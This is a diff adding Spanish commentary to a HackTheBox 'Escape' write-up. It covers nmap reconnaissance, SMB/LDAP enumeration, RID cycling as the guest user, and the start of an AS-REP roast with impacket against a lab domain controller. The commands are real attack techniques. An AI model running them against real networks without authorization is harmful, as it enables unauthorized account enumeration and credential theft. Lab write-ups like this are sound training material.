@@ -23,7 +23,7 @@ layout:
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Escape**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.202 -oG allPorts
@@ -90,7 +90,7 @@ Nmap done: 1 IP address (1 host up) scanned in 193.11 seconds
            Raw packets sent: 196703 (8.655MB) | Rcvd: 249 (14.596KB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -103,9 +103,7 @@ Nmap done: 1 IP address (1 host up) scanned in 193.11 seconds
 [*] Ports copied to clipboard
 ```
 
-
-
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. Verificamos a través del resultado obtenido de que la máquina se trata de un Domain Controller (DC) por los puertos y servicios que se encuentran expuestos.
 
 ```bash
 ❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49713,49732,49752 10.10.11.202 -A -oN targeted -oX targetedXML
@@ -205,27 +203,39 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 105.88 seconds
 ```
 
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
+```bash
+❯ xsltproc targetedXML > index.html
+
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
+
+<figure><img src="../../.gitbook/assets/imagen (423).png" alt=""><figcaption></figcaption></figure>
+
+A través de la herramienta de `nxc` y `ldapsearch` enumeraremos el equipo para localizar más información. Entre la información obtenida, verificamos el `hostname`, versión del SO y el nombre del dominio.
 
 ```bash
 ❯ nxc smb 10.10.11.202
 SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+
 ❯ ldapsearch -x -H ldap://10.10.11.202 -s base | grep defaultNamingContext
 defaultNamingContext: DC=sequel,DC=htb
 ```
 
-
+Añadiremos en nuestro archivo `/etc/hosts` las entradas correspondientes para que a la hora de hacer referencia al dominio o el equipo, nos responda correctamente a la dirección IP del Domain Controller.
 
 ```bash
 ❯ cat /etc/hosts | grep sequel.htb
 10.10.11.202 sequel.htb DC.sequel.htb
 ```
 
-
-
 ## RID Cycling Attack
 
-
+Revisaremos si el usuario `guest` (Invitado) se encuentra habilitado en el dominio. A través de `nxc` logramos verificar de la existencia del usuario, con lo cual podríamos llegar a intentar enumerar el SMB con este usuario, probar de enumerar usuarios, etc.
 
 ```bash
 ❯ nxc smb 10.10.11.202 -u 'guest' -p ''
@@ -233,7 +243,7 @@ SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019
 SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 
 ```
 
-
+A través de la herramienta de `ridenum` trataremos de realizar un `RID Cycling Attack` para lograr enumerar usuarios a través de fuerza bruta del RID. Comprobamos el resultado en el cual se muestran los diferentes nombres de usuarios existentes en el dominio.
 
 ```bash
 ❯ ridenum 10.10.11.202 500 2500 guest ''
@@ -256,9 +266,7 @@ Account name: sequel\Nicole.Thompson
 [*] RIDENUM has finished enumerating user accounts...
 ```
 
-
-
-
+Nos guardaremos el resultado en el archivo `users.txt`. A través de expresiones regulares, nos quedaremos solamente con los nombres de usuarios correspondientes.
 
 ```bash
 ❯ cat users.txt
@@ -290,7 +298,7 @@ Nicole.Thompson
 
 ## AS-REP Roast Attack \[FAILED]
 
-
+Dado que disponemos de una lista potencial de usuarios válidos del dominio, probaremos de realizar un `AS-REP Roast Attack` para lograr obtener un `Ticket Granting Ticket` (`TGT`) de aquellos usuarios que tengan asignado el `DONT_REQ_PREAUTH` de Kerberos.
 
 ```bash
 ❯ impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/ 2>/dev/null
